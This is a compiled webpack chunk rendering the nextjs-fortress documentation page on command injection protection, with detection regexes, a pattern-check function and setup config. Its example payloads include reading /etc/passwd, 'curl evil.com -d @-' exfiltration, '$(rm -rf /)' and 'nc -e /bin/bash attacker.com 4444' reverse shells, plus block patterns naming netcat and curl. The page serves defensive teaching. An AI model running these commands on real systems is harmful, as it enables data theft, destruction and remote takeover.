"use strict";(globalThis.webpackChunkdocs=globalThis.webpackChunkdocs||[]).push([[86],{5926(e,n,t){t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>c,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"modules/injection/command-injection","title":"Command Injection Protection","description":"Overview","source":"@site/docs/modules/injection/command-injection.md","sourceDirName":"modules/injection","slug":"/modules/injection/command-injection","permalink":"/nextjs-fortress/docs/modules/injection/command-injection","draft":false,"unlisted":false,"editUrl":"https://github.com/mindfiredigital/nextjs-fortress/tree/main/docs/docs/modules/injection/command-injection.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"SQL Injection Protection","permalink":"/nextjs-fortress/docs/modules/injection/sql-injection"},"next":{"title":"XSS Protection (Cross-Site Scripting)","permalink":"/nextjs-fortress/docs/modules/injection/xss-protection"}}');var s=t(7900),r=t(6493);const c={},l="Command Injection Protection",o={},a=[{value:"Overview",id:"overview",level:2},{value:"Why This Is Important",id:"why-this-is-important",level:2},{value:"The Problem: Command Injection Attacks",id:"the-problem-command-injection-attacks",level:3},{value:"1. <strong>Shell Metacharacter Injection</strong>",id:"1-shell-metacharacter-injection",level:4},{value:"2. <strong>Pipe Command Injection</strong>",id:"2-pipe-command-injection",level:4},{value:"3. <strong>Command Substitution</strong>",id:"3-command-substitution",level:4},{value:"4. <strong>Reverse Shell</strong>",id:"4-reverse-shell",level:4},{value:"How nextjs-fortress Solves This",id:"how-nextjs-fortress-solves-this",level:2},{value:"Detection Patterns",id:"detection-patterns",level:3},{value:"The Algorithm",id:"the-algorithm",level:3},{value:"Attack Examples",id:"attack-examples",level:2},{value:"Example 1: Semicolon Command Chaining",id:"example-1-semicolon-command-chaining",level:3},{value:"Example 2: Pipe Data Exfiltration",id:"example-2-pipe-data-exfiltration",level:3},{value:"Example 3: Command Substitution",id:"example-3-command-substitution",level:3},{value:"Example 4: Reverse Shell",id:"example-4-reverse-shell",level:3},{value:"Shell Metacharacters Blocked",id:"shell-metacharacters-blocked",level:2},{value:"How to Initialize",id:"how-to-initialize",level:2},{value:"Summary",id:"summary",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"command-injection-protection",children:"Command Injection Protection"})}),"\n",(0,s.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,s.jsx)(n.p,{children:"Command injection protection detects and blocks malicious shell commands in payloads that could execute arbitrary commands on the server operating system."}),"\n",(0,s.jsx)(n.h2,{id:"why-this-is-important",children:"Why This Is Important"}),"\n",(0,s.jsx)(n.h3,{id:"the-problem-command-injection-attacks",children:"The Problem: Command Injection Attacks"}),"\n",(0,s.jsx)(n.p,{children:"Attackers inject shell commands to execute arbitrary code on the server:"}),"\n",(0,s.jsxs)(n.h4,{id:"1-shell-metacharacter-injection",children:["1. ",(0,s.jsx)(n.strong,{children:"Shell Metacharacter Injection"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// File upload with malicious filename\n{\n  "filename": "document.pdf; cat /etc/passwd"\n}\n\n// Without protection, if app uses:\nexec(`convert ${filename} output.jpg`);\n// Executes: convert document.pdf; cat /etc/passwd output.jpg\n// Result: Password file exposed\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Shell commands executed"}),"\n",(0,s.jsx)(n.li,{children:"System files accessed"}),"\n",(0,s.jsx)(n.li,{children:"Credentials exposed"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"File system access"}),"\n",(0,s.jsx)(n.li,{children:"Credential theft"}),"\n",(0,s.jsx)(n.li,{children:"System compromise"}),"\n",(0,s.jsx)(n.li,{children:"Privilege escalation"}),"\n"]}),"\n",(0,s.jsxs)(n.h4,{id:"2-pipe-command-injection",children:["2. ",(0,s.jsx)(n.strong,{children:"Pipe Command Injection"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Search query with pipe\n{\n  "query": "logs | grep password | curl evil.com -d @-"\n}\n\n// Without protection:\nexec(`cat logs.txt | grep "${query}"`);\n// Executes: cat logs.txt | grep "logs | grep password | curl evil.com -d @-"\n// Result: Passwords sent to attacker\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Pipe commands chain operations"}),"\n",(0,s.jsx)(n.li,{children:"Data exfiltrated"}),"\n",(0,s.jsxs)(n.li,{children:["Remote server receives d\n",(0,s.jsx)(n.strong,{children:"Impact:"})," Data exfiltration Silent attacks Credential leakage Database dumps"]}),"\n"]}),"\n",(0,s.jsxs)(n.h4,{id:"3-command-substitution",children:["3. ",(0,s.jsx)(n.strong,{children:"Command Substitution"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Backup path with substitution\n{\n  "path": "$(rm -rf /)"\n}\n\n// Without protection:\nexec(`backup ${path}`);\n// Executes: backup $(rm -rf /)\n// Result: Entire filesystem deleted\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Command substitution executes first"}),"\n",(0,s.jsx)(n.li,{children:"Destructive commands run"}),"\n",(0,s.jsx)(n.li,{children:"System destroyed"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"File system destruction"}),"\n",(0,s.jsx)(n.li,{children:"Data deletion"}),"\n",(0,s.jsx)(n.li,{children:"Service outage"}),"\n",(0,s.jsx)(n.li,{children:"Business loss"}),"\n"]}),"\n",(0,s.jsxs)(n.h4,{id:"4-reverse-shell",children:["4. ",(0,s.jsx)(n.strong,{children:"Reverse Shell"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Malicious webhook URL\n{\n  "webhook": "http://example.com; nc -e /bin/bash attacker.com 4444"\n}\n\n// Without protection:\nexec(`curl ${webhook}`);\n// Executes: curl http://example.com; nc -e /bin/bash attacker.com 4444\n// Result: Shell access to attacker\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What Happens Without Protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Reverse shell established"}),"\n",(0,s.jsx)(n.li,{children:"Attacker gains shell access"}),"\n",(0,s.jsx)(n.li,{children:"Full server control"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Impact:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Complete server compromise"}),"\n",(0,s.jsx)(n.li,{children:"Root access possible"}),"\n",(0,s.jsx)(n.li,{children:"Persistent backdoor"}),"\n",(0,s.jsx)(n.li,{children:"Network pivot point"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"how-nextjs-fortress-solves-this",children:"How nextjs-fortress Solves This"}),"\n",(0,s.jsx)(n.h3,{id:"detection-patterns",children:"Detection Patterns"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"export const COMMAND_PATTERNS = [\n  /[;&|`$(){}[\\]<>]/,                    // Shell metacharacters\n  /(bash|sh|cmd|powershell|exec|spawn)/gi, // Shell executables\n  /(\\|\\s*cat\\s+)/gi,                     // Pipe to cat\n  /(>\\s*\\/dev\\/null)/gi,                 // Output redirection\n  /(\\$\\(.*\\))/g,                          // Command substitution\n  /(wget|curl).*http/gi,                  // Remote code fetching\n  /(nc|netcat).*-e/gi,                    // Reverse shells\n];\n"})}),"\n",(0,s.jsx)(n.h3,{id:"the-algorithm",children:"The Algorithm"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"/**\n * Check a string against command injection patterns\n */\nprivate checkPatterns(\n  str: string,\n  patterns: RegExp[],\n  type: string\n): ValidationResult {\n  for (const pattern of patterns) {\n    pattern.lastIndex = 0;\n    const match = pattern.exec(str);\n\n    if (match) {\n      return {\n        valid: false,\n        severity: 'critical',\n        message: `Command injection detected: \"${match[0]}\"`,\n        rule: 'command_injection',\n        pattern: match[0],\n        confidence: 0.9,\n      };\n    }\n  }\n\n  return { valid: true };\n}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"attack-examples",children:"Attack Examples"}),"\n",(0,s.jsx)(n.h3,{id:"example-1-semicolon-command-chaining",children:"Example 1: Semicolon Command Chaining"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// File processing request\nPOST /api/process\n{\n  "file": "report.pdf; cat /etc/passwd"\n}\n\n// Fortress detects:\n// Pattern match: ";" found\n// Severity: critical\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h3,{id:"example-2-pipe-data-exfiltration",children:"Example 2: Pipe Data Exfiltration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Log search request\nPOST /api/logs/search\n{\n  "term": "error | curl https://evil.com -d @-"\n}\n\n// Fortress detects:\n// Pattern match: "|" and "curl" found\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h3,{id:"example-3-command-substitution",children:"Example 3: Command Substitution"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Backup path\nPOST /api/backup\n{\n  "destination": "$(whoami)"\n}\n\n// Fortress detects:\n// Pattern match: "$(...)" found\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h3,{id:"example-4-reverse-shell",children:"Example 4: Reverse Shell"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Webhook callback\nPOST /api/webhook\n{\n  "url": "http://site.com; nc -e /bin/bash attacker.com 4444"\n}\n\n// Fortress detects:\n// Pattern match: ";" and "nc -e" found\n// Result: BLOCKED \u2705\n'})}),"\n",(0,s.jsx)(n.h2,{id:"shell-metacharacters-blocked",children:"Shell Metacharacters Blocked"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"// These characters enable command chaining and injection\n;   // Command separator\n&   // Background execution\n|   // Pipe to another command\n`   // Command substitution (backticks)\n$   // Variable/command substitution\n()  // Subshell execution\n{}  // Brace expansion\n[]  // Character class\n<>  // Input/output redirection\n"})}),"\n",(0,s.jsx)(n.h2,{id:"how-to-initialize",children:"How to Initialize"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';\n\nexport const fortressConfig: FortressConfig = {\n  enabled: true,\n  mode: 'development',\n\n  modules: {\n    injection: {\n      enabled: true,\n      checks: ['command'],\n    },\n  },\n\n  onSecurityEvent: async (event) => {\n    if (event.detection.rule === 'command_injection') {\n      const logger = new FortressLogger({\n        enabled: true,\n        level: 'warn',\n        destination: 'console',\n      });\n\n      logger.warn('\u26a1 Command Injection Blocked', {\n        pattern: event.detection.pattern,\n        ip: event.request.ip,\n        path: event.request.path,\n      });\n    }\n  },\n};\n"})}),"\n",(0,s.jsx)(n.h2,{id:"summary",children:"Summary"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What happens without command injection protection:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Arbitrary command execution"}),"\n",(0,s.jsx)(n.li,{children:"File system access"}),"\n",(0,s.jsx)(n.li,{children:"Data exfiltration"}),"\n",(0,s.jsx)(n.li,{children:"Complete server compromise"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"What nextjs-fortress provides:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Metacharacter detection"}),"\n",(0,s.jsx)(n.li,{children:"Shell command blocking"}),"\n",(0,s.jsx)(n.li,{children:"Substitution prevention"}),"\n",(0,s.jsx)(n.li,{children:"Reverse shell protection"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"How to initialize:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-typescript",children:"injection: {\n  enabled: true,\n  checks: ['command'],\n}\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Related Documentation:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"/nextjs-fortress/docs/modules/injection/sql-injection",children:"SQL Injection Protection"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"/nextjs-fortress/docs/modules/injection/xss-protection",children:"XSS Protection"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"/nextjs-fortress/docs/modules/injection/code-injection",children:"Code Injection Protection"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},6493(e,n,t){t.d(n,{R:()=>c,x:()=>l});var i=t(2128);const s={},r=i.createContext(s);function c(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);